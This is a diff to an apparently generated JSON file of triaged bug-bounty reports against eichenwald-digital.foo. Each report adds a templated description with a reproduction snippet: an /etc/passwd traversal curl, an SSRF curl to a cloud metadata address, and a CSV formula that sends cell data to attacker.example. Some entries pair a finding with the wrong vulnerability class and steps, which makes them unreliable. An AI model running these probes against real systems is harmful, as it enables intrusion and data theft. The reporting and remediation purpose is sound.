+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://open-data.eichenwald-digital.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4984,7 +5022,8 @@
           "offset": "3d 19h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://open-data.eichenwald-digital.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5071,7 +5110,8 @@
           "offset": "2d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://open-data.eichenwald-digital.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5235,7 +5275,8 @@
           "offset": "4d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://open-data.eichenwald-digital.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5359,7 +5400,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.eichenwald-digital.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5475,7 +5517,8 @@
           "offset": "4d 23h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.eichenwald-digital.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5583,7 +5626,8 @@
           "offset": "7h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://open-data.eichenwald-digital.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5707,7 +5751,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://open-data.eichenwald-digital.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5817,7 +5862,8 @@
           "offset": "7d 2h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.eichenwald-digital.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5944,7 +5990,8 @@
           "offset": "3d 2h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.eichenwald-digital.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6076,7 +6123,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://open-data.eichenwald-digital.foo/console/queue`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -6220,7 +6268,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://open-data.eichenwald-digital.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6354,7 +6403,8 @@
           "offset": "3d 8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://open-data.eichenwald-digital.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6472,7 +6522,8 @@
           "offset": "1d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://open-data.eichenwald-digital.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6569,7 +6620,8 @@
           "offset": "15h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.eichenwald-digital.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6708,7 +6760,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://open-data.eichenwald-digital.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6864,7 +6917,8 @@
           "offset": "2d 9h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://open-data.eichenwald-digital.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6987,7 +7041,8 @@
           "offset": "5d 3h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://open-data.eichenwald-digital.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7122,7 +7177,8 @@
           "offset": "4d 4h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://open-data.eichenwald-digital.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7273,7 +7329,8 @@
           "offset": "4d 23h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://iam.eichenwald-digital.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7417,7 +7474,8 @@
           "offset": "8d 21h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.eichenwald-digital.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7537,7 +7595,8 @@
           "offset": "2d 3h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.eichenwald-digital.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7696,7 +7755,8 @@
           "offset": "3d 5h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.eichenwald-digital.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7847,7 +7907,8 @@
           "offset": "3d",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://iam.eichenwald-digital.foo/export?type=records`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7957,7 +8018,8 @@
           "offset": "4d 5h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.eichenwald-digital.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8081,7 +8143,8 @@
           "offset": "1d 18h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.eichenwald-digital.foo/statements/`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8233,7 +8296,8 @@
           "offset": "1d 19h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.eichenwald-digital.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8360,7 +8424,8 @@
           "offset": "6d 16h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://iam.eichenwald-digital.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8475,7 +8540,8 @@
           "offset": "4d 13h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://iam.eichenwald-digital.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8590,7 +8656,8 @@
           "offset": "8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.eichenwald-digital.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8757,7 +8824,8 @@
           "offset": "7d 3h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.eichenwald-digital.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -8838,7 +8906,8 @@
           "offset": "1d 7h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
